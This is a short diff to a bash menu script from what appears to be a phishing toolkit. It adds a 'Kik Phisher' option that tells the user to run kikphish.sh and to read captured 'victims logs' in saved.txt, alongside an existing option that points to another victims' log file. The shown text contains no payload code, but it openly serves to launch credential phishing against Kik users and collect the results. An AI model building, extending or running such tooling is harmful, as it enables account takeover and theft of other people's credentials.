@@ -25,7 +25,13 @@ case $choice in
         echo "Find the victims logs in cd tools/phishers/ and then open logs.txt"
         read -p "Press [Enter] to return to the menu or exit..."
         ;;
-    
+
+    3)
+        # Display a message and wait for user to press Enter
+        echo "Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh"
+        echo "Find the victims logs in cd tools/phishers/ and then open saved.txt"
+        read -p "Press [Enter] to return to the menu or exit..."
+        ;;
     0)
         # Exit the script
         echo "Exiting..."
